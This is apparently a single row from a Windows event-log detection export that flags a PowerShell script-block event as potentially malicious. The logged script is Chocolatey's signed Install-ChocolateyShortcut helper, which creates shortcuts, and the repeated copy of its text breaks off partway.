"2019-03-19 14:21:36.979 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,74,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyShortcut { <# .SYNOPSIS Creates a shortcut .DESCRIPTION This adds a shortcut, at the specified location, with the option to specify a number of additional properties for the shortcut, such as Working Directory, Arguments, Icon Location, and Description. .NOTES If this errors, as it may if being run under the local SYSTEM account with particular folder that SYSTEM doesn't have, it will display a warning instead of failing a package installation. .INPUTS None .OUTPUTS None .PARAMETER ShortcutFilePath The full absolute path to where the shortcut should be created. .PARAMETER TargetPath The full absolute path to the target for new shortcut. .PARAMETER WorkingDirectory OPTIONAL - The full absolute path of the Working Directory that will be used by the new shortcut. As of v0.10.12, the directory will be created unless it contains environment variable expansion like `%AppData%\FooBar`. .PARAMETER Arguments OPTIONAL - Additonal arguments that should be passed along to the new shortcut. .PARAMETER IconLocation OPTIONAL- The full absolute path to an icon file to be used for the new shortcut. .PARAMETER Description OPTIONAL - A text description to be associated with the new description. .PARAMETER WindowStyle OPTIONAL - Type of windows target application should open with. Available in 0.9.10+. 0 = Hidden, 1 = Normal Size, 3 = Maximized, 7 - Minimized. Full list table 3.9 here: https://technet.microsoft.com/en-us/library/ee156605.aspx .PARAMETER RunAsAdmin OPTIONAL - Set ""Run As Administrator"" checkbox for the created the shortcut. Available in 0.9.10+. .PARAMETER PinToTaskbar OPTIONAL - Pin the new shortcut to the taskbar. Available in 0.9.10+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This will create a new shortcut at the location of ""C:\test.lnk"" and # link to the file located at ""C:\text.exe"" Install-ChocolateyShortcut -ShortcutFilePath ""C:\test.lnk"" -TargetPath ""C:\test.exe"" .EXAMPLE > # This will create a new shortcut at the location of ""C:\notepad.lnk"" # and link to the Notepad application. In addition, other properties # are being set to specify the working directory, an icon to be used for # the shortcut, along with a description and arguments. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WorkingDirectory ""C:\"" ` -Arguments ""C:\test.txt"" ` -IconLocation ""C:\test.ico"" ` -Description ""This is the description"" .EXAMPLE > # Creates a new notepad shortcut on the root of c: that starts # notepad.exe as Administrator. Shortcut is also pinned to taskbar. # These parameters are available in 0.9.10+. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WindowStyle 3 ` -RunAsAdmin ` -PinToTaskbar .LINK Install-ChocolateyDesktopLink .LINK Install-ChocolateyExplorerMenuItem .LINK Install-ChocolateyPinnedTaskBarItem #> param( [parameter(Mandatory=$true, Position=0)][string] $shortcutFilePath, [parameter(Mandatory=$true, Position=1)][string] $targetPath, [parameter(Mandatory=$false, Position=2)][string] $workingDirectory, [parameter(Mandatory=$false, Position=3)][string] $arguments, [parameter(Mandatory=$false, Position=4)][string] $iconLocation, [parameter(Mandatory=$false, Position=5)][string] $description, [parameter(Mandatory=$false, Position=6)][int] $windowStyle, [parameter(Mandatory=$false)][switch] $runAsAdmin, [parameter(Mandatory=$false)][switch] $pinToTaskbar, [parameter(ValueFromRemainingArguments = $true)][Object[]]$ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters # http://powershell.com/cs/blogs/tips/archive/2009/02/05/validating-a-url.aspx function isURIWeb($address) { $uri = $address -as [System.URI] $uri.AbsoluteURI -ne $null -and $uri.Scheme -match '[http|https]' } if (!$shortcutFilePath) { # shortcut file path could be null if someone is trying to get special # paths for LocalSystem (SYSTEM). Write-Warning ""Unable to create shortcut. `$shortcutFilePath can not be null."" return } $shortcutDirectory = $([System.IO.Path]::GetDirectoryName($shortcutFilePath)) if (!(Test-Path($shortcutDirectory))) { [System.IO.Directory]::CreateDirectory($shortcutDirectory) | Out-Null } if (!$targetPath) { throw ""Install-ChocolateyShortcut - `$targetPath can not be null."" } if(!(Test-Path($targetPath)) -and !(IsURIWeb($targetPath))) { Write-Warning ""'$targetPath' does not exist. If it is not created the shortcut will not be valid."" } if($iconLocation) { if(!(Test-Path($iconLocation))) { Write-Warning ""'$iconLocation' does not exist. A default icon will be used."" } } if ($workingDirectory) { if ($workingDirectory -notmatch '%\w+%' -and !(Test-Path($workingDirectory))) { [System.IO.Directory]::CreateDirectory($workingDirectory) | Out-Null } } Write-Debug ""Creating Shortcut..."" try { $global:WshShell = New-Object -com ""WScript.Shell"" $lnk = $global:WshShell.CreateShortcut($shortcutFilePath) $lnk.TargetPath = $targetPath $lnk.WorkingDirectory = $workingDirectory $lnk.Arguments = $arguments if($iconLocation) { $lnk.IconLocation = $iconLocation } if ($description) { $lnk.Description = $description } if ($windowStyle) { $lnk.WindowStyle = $windowStyle } $lnk.Save() Write-Debug ""Shortcut created."" [System.IO.FileInfo]$Path = $shortcutFilePath If ($runAsAdmin) { #In order to enable the ""Run as Admin"" checkbox, this code reads the .LNK as a stream # and flips a specific bit while writing a new copy. It then replaces the original # .LNK with the copy, similar to this example: http://poshcode.org/2513 $TempFileName = [IO.Path]::GetRandomFileName() $TempFile = [IO.FileInfo][IO.Path]::Combine($Path.Directory, $TempFileName) $Writer = New-Object System.IO.FileStream $TempFile, ([System.IO.FileMode]::Create) $Reader = $Path.OpenRead() While ($Reader.Position -lt $Reader.Length) { $Byte = $Reader.ReadByte() If ($Reader.Position -eq 22) {$Byte = 34} $Writer.WriteByte($Byte) } $Reader.Close() $Writer.Close() $Path.Delete() Rename-Item -Path $TempFile -NewName $Path.Name | Out-Null } If ($pinToTaskbar) { $scfilename = $Path.FullName $pinverb = (new-object -com ""shell.application"").namespace($(split-path -parent $Path.FullName)).Parsename($(split-path -leaf $Path.FullName)).verbs() | ?{$_.Name -eq 'Pin to Tas&kbar'} If ($pinverb) {$pinverb.doit()} } } catch { Write-Warning ""Unable to create shortcut. Error captured was $($_.Exception.Message)."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCV4kKnyvkP8Q6w # z2NjPs2m5xO4ValwoIiDMeri2Kx1gKCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgM4dhQyywPrPo8jpeR3DNbT7H2WdznBS1+Bus # KT2bfQ0wDQYJKoZIhvcNAQEBBQAEggEAbWUKxJRm84/EF8/zeqa1zKe4AWpJ/gEi # QwtcOXs0Qnyft51e8c1xU2GOQZgAGvgSh7/PxsyVsFf5RMUF4KTVDTiF1PBanepr # vyJHjlmCWoa+NIncrLkelzSZLVmR91IGBpxxuL3E03d1rLOBK3MsTsv/n1l0nTzj # Th0bWNHNjcnJ89/jqS6j0E/x06GXwECdXPke/u6rpZ+ne5huAOlJgmce9bBL1v39 # SLEstdUW37fHTfvf8W4O3vdUYwXayuZOv+5ACQA5wVnwEL/jv+qxNFlM1ciPSuDH # DnFvlJp1vUavbyg9F+n4RYni9EUQTAw9F7Izk3Mt3mS6HCFwSwVWtaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQUAIvU+JA/yY/VMDda # AF5AyoutdvkwDQYJKoZIhvcNAQEBBQAEggEAAw12+/6F/pa2s2bjPlFgk4ZjQcRt # p/abG6OoDWEMorncdvyhrOe39oQxthDUOLm/FW8JvvlFNHxBwjCy4KUxPRTsmmBf # JKzuGv9Au1dfjGJAS+lPZyxTC5nyeKbCnG3Zwy77dAxvN2ZVd/vRhyw/itKoE3Lv # MSvUKhrRTFB1Sm7if/dh9r5YiBFCgKoTJJ9PCxIrGOx6R3Gbci+StDJXHBDOqgDh # HNoYd6Z6V6AKPy3mzU3yitDuMA2ugksV6OHroWUCUGfVkUCPHJZMceJVXzYTbCUS # wgDjjauYaSo+kzjicD27CjwNSeHZP0MSLFSoHfoU76lF2iplygQ1pdmkMw== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Install-ChocolateyShortcut.ps1 ¦ ScriptBlockId: 7bc11748-ac2b-44dc-ab9d-bc934fe384e4 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyShortcut { <# .SYNOPSIS Creates a shortcut .DESCRIPTION This adds a shortcut, at the specified location, with the option to specify a number of additional properties for the shortcut, such as Working Directory, Arguments, Icon Location, and Description. .NOTES If this errors, as it may if being run under the local SYSTEM account with particular folder that SYSTEM doesn't have, it will display a warning instead of failing a package installation. .INPUTS None .OUTPUTS None .PARAMETER ShortcutFilePath The full absolute path to where the shortcut should be created. .PARAMETER TargetPath The full absolute path to the target for new shortcut. .PARAMETER WorkingDirectory OPTIONAL - The full absolute path of the Working Directory that will be used by the new shortcut. As of v0.10.12, the directory will be created unless it contains environment variable expansion like `%AppData%\FooBar`. .PARAMETER Arguments OPTIONAL - Additonal arguments that should be passed along to the new shortcut. .PARAMETER IconLocation OPTIONAL- The full absolute path to an icon file to be used for the new shortcut. .PARAMETER Description OPTIONAL - A text description to be associated with the new description. .PARAMETER WindowStyle OPTIONAL - Type of windows target application should open with. Available in 0.9.10+. 0 = Hidden, 1 = Normal Size, 3 = Maximized, 7 - Minimized. Full list table 3.9 here: https://technet.microsoft.com/en-us/library/ee156605.aspx .PARAMETER RunAsAdmin OPTIONAL - Set ""Run As Administrator"" checkbox for the created the shortcut. Available in 0.9.10+. .PARAMETER PinToTaskbar OPTIONAL - Pin the new shortcut to the taskbar. Available in 0.9.10+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This will create a new shortcut at the location of ""C:\test.lnk"" and # link to the file located at ""C:\text.exe"" Install-ChocolateyShortcut -ShortcutFilePath ""C:\test.lnk"" -TargetPath ""C:\test.exe"" .EXAMPLE > # This will create a new shortcut at the location of ""C:\notepad.lnk"" # and link to the Notepad application. In addition, other properties # are being set to specify the working directory, an icon to be used for # the shortcut, along with a description and arguments. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WorkingDirectory ""C:\"" ` -Arguments ""C:\test.txt"" ` -IconLocation ""C:\test.ico"" ` -Description ""This is the description"" .EXAMPLE > # Creates a new notepad shortcut on the root of c: that starts # notepad.exe as Administrator. Shortcut is also pinned to taskbar. # These parameters are available in 0.9.10+. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WindowStyle 3 ` -RunAsAdmin ` -PinToTaskbar .LINK Install-ChocolateyDesktopLink .LINK Install-ChocolateyExplorerMenuItem .LINK Install-ChocolateyPinnedTaskBarItem #> param( [parameter(Mandatory=$true, Position=0)][string] $shortcutFilePath, [parameter(Mandatory=$true, Position=1)][string] $targetPath, [parameter(Mandatory=$false, Position=2)][string] $workingDirectory, [parameter(Mandatory=$false, Position=3)][string] $arguments, [parameter(Mandatory=$false, Position=4)][string] $iconLocation, [parameter(Mandatory=$false, Position=5)][string] $description, [parameter(Mandatory=$false, Position=6)][int] $windowStyle, [parameter(Mandatory=$false)][switch] $runAsAdmin, [parameter(Mandatory=$false)][switch] $pinToTaskbar, [parameter(ValueFromRemainingArguments = $true)][Object[]]$ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters # 